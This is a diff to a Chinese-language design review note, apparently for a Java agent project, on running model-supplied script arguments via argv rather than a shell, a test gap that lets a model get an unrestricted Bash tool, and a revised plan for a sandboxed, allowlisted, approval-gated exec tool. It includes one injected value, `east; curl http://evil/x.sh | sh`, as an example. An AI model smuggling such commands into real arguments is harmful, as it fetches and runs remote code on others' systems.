@@ -62,7 +62,11 @@
 - 为什么不用：ADR-0002 的修订记录（2026-10-24 code-review 那条）已经把这个接缝记过一遍——`ExecSpec` 只有一个 `String command`，参数必然被 shell 解释，当时挡住注入的只有 `ScriptPackageRunner` 里一处手写 `quote()`。于是起进程收回到只收 argv 的 `LocalProcessRunner`。
 - 例子：脚本包 `report.sh` 收 `--region`，值由模型给。走 shell（OpenClaw 的 `exec` 和 `ShellTools.Bash` 都是这条路）时，`east; curl http://evil/x.sh | sh` 的分号后那段会被执行；走 argv 时它只是 `--region` 的一个取值。**同一句模型输出，一条路是数据，另一条路是命令。**
 - 一句：同一个能力有两种接缝——它把命令交给 shell，因为它的 `exec` 本来就是把命令交给 shell；我们把参数当数据，代价是入口脚本必须自己可执行、第一行给出解释器（静态检查挡在落盘之前）。
-- **附带发现：这条红线的机器证据有洞。** `BuildContractTest:83-89` 查的是"我们的类不依赖 `ProcessBuilder`"、`:97` 扫的是源码里的 shell 字面量；**注册一个 `@Bean ShellTools` 两样都不触发**——`ShellTools` 在库里，我们不 new `ProcessBuilder`，也不写 `bash -c` 字面量。于是机器闸保持绿色，模型却拿到了 `Bash`。要补的是一条"`io.github.claw4j..` 不得依赖 `ShellTools`"的规则。
+- **附带发现：这条红线的机器证据有洞。** `BuildContractTest:83-89` 查的是"我们的类不依赖 `ProcessBuilder`"、`:97` 扫的是源码里的 shell 字面量；**注册一个 `@Bean ShellTools` 两样都不触发**——`ShellTools` 在库里，我们不 new `ProcessBuilder`，也不写 `bash -c` 字面量。于是机器闸保持绿色，模型却拿到了 `Bash`。
+  〔2026-11-08 更正〕洞是真的，但**补法不是"加一条禁令"**：通用 shell 是大模型的正经需求，OpenClaw 的 `exec`
+  就是它（`docs/tools/exec.md`、`permission-modes.md`、`exec-approvals.md`）。我们缺的是这个能力。
+  所以那块洞的落点是"照 `exec` 补一个带沙箱 / 白名单 / 审批的入口，规则拦的是**裸装**"，
+  见 `.scratch/openclaw-alignment/issues/01-exec-tool.md`。写成"永远不许 shell"是本末倒置。
 
 ## m2-real-model-testing
 
@@ -151,5 +155,6 @@
 
 - 2026-11-08 已拆票：上面四处（`capability-02` / `capability-08` 的红线洞 / `closeout-04` / `closeout-05`）
   落成 `.scratch/openclaw-alignment/issues/01–04`，顺序与代价写在 `.scratch/openclaw-alignment/spec.md`。
-  `01` 是 08 的机器闸，不是产品行为改动。
+  `01` **重写过一次**：现在是"照 `exec` 的形态补通用 shell（沙箱 + 白名单 + 审批）"，
+  不是第一版那条"禁止依赖 `ShellTools`"——命题改对了，理由见票面第一节。
 
